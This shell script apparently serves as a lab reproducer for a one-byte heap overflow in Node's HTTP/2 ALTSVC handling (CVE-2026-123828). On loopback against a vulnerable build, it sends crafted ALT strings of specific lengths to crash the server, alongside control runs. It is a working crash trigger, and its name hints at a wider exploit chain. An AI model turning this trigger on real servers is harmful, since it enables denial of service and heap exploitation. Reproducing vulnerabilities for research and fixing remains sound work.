#!/bin/sh
# node2shell — reproducible SECOND-terminator (value buffer) overflow.
#
# Wake 33, CVE-2026-123828. The upstream fix ae9ab37d62 removes
# kNullTerminate from BOTH MaybeStackBuffer writes in
# Http2Session::AltSvc; the value write is an independently reachable
# one-byte heap overflow when the application's ALT string exceeds 1024
# bytes and its length is 8 (mod 16). This script isolates it from the
# well-studied origin write: :authority_len=1048 gives origin_len=1056
# (0 mod 16), so origin's own NUL lands in the next chunk's unused
# prev_size and is harmless (stage-A off-class control). The only
# corrupting write left is value's.
#
# Loopback only; vulnerable prebuilt v24.22.2. Expected:
#   ALT 1048 (8 mod 16) -> server SIGABRT (134), "invalid next size (unsorted)"
#   ALT 1200 (0 mod 16) -> server alive, client prints ALTSVC
#   ALT 10              -> server alive, client prints ALTSVC
# Usage: sh run.sh [runs]
BASE=$(cd "$(dirname "$0")/../../.." && pwd)
set -u

NODE=${VULN_BIN:-$BASE/lab/node2shell/bin/node-v24.22.2-linux-x64/bin/node}
SRV=$BASE/lab/repro/node2shell-rung1-server.js
CLI=$BASE/lab/repro/node2shell-rung1-client.js
OUT=${OUT:-$BASE/lab/node2shell/tmp/w33valnul}
RUNS=${1:-3}
AUTH=1048
mkdir -p "$OUT"

# Build a syntactically acceptable ALT of exactly $1 bytes:
# 'h2x:' + digits + '#'.
mkalt() {
  _n=$1
  printf 'h2x:'
  _k=0
  while [ "$_k" -lt $((_n - 5)) ]; do printf '8'; _k=$((_k + 1)); done
  printf '#'
}

one_run() {
  _altlen=$1
  _tag=$2
  _alt=$(mkalt "$_altlen")
  "$NODE" "$SRV" 0 "$_alt" >"$OUT/$_tag.srv.out" 2>"$OUT/$_tag.srv.err" &
  _srv=$!
  _port=""
  _k=0
  while [ "$_k" -lt 50 ]; do
    _port=$(awk '/^LISTEN/{print $2}' "$OUT/$_tag.srv.out" 2>/dev/null)
    [ -n "$_port" ] && break
    _k=$((_k + 1)); sleep 0.1
  done
  if [ -n "$_port" ]; then
    "$NODE" "$CLI" "$_port" "$AUTH" >"$OUT/$_tag.cli.out" 2>&1
  else
    echo "no-port" > "$OUT/$_tag.cli.out"
  fi
  sleep 0.3
  if kill -0 "$_srv" 2>/dev/null; then
    kill -9 "$_srv" 2>/dev/null; wait "$_srv" 2>/dev/null; _rc=137
  else
    wait "$_srv" 2>/dev/null; _rc=$?
  fi
  printf '%-12s altlen=%-5s server_rc=%-4s msg="%s" client=%s\n' \
    "$_tag" "$_altlen" "$_rc" "$(head -1 "$OUT/$_tag.srv.err")" \
    "$(grep -o 'ALTSVC\|TIMEOUT' "$OUT/$_tag.cli.out" | head -1)"
}

echo "== vulnerable $($NODE --version), :authority_len=$AUTH (origin_len 1056, off-class)"
_run=1
while [ "$_run" -le "$RUNS" ]; do
  one_run 1048 "onclass$_run"
  _run=$((_run + 1))
done
one_run 1200 offclass
one_run 10 short
echo "== logs: $OUT/"
